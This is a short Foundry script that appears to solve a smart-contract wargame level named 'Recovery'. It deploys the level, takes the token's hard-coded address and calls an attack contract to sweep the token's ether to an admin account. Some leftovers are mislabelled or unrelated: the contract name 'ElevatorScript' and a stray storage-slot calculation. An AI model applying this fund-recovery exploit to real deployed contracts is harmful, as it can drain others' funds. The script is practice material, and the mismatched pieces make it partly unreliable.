//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Recovery, Solution} from "../src/level/Recovery.sol";

contract ElevatorScript is Test {
    address recovery;
    address solution;
    address token;
    address admin = makeAddr("Admin");

    function run() external {
        deal(admin, 1000 ether);
        vm.startBroadcast(admin);
        recovery = address(new Recovery());
        Recovery(recovery).generateToken("Lori", 100);
        token = 0x095cE44a51A648eD3f568279E9248648D2bc0356;
        solution = address(new Solution(token));
        Solution(solution).att(payable(admin));
        require(token.balance == 0);
        unchecked {
            uint256 index = uint256(2) ** uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
            console2.log(index);
        }
    }
}
